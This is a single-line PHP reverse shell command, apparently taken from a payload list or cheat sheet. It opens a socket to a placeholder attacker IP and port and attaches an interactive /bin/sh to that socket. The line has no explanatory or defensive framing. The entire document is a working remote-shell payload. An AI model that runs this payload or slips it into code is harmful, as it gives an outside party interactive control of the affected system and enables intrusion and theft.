php -r '$sock=fsockopen("{IP ATTACKER}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");'
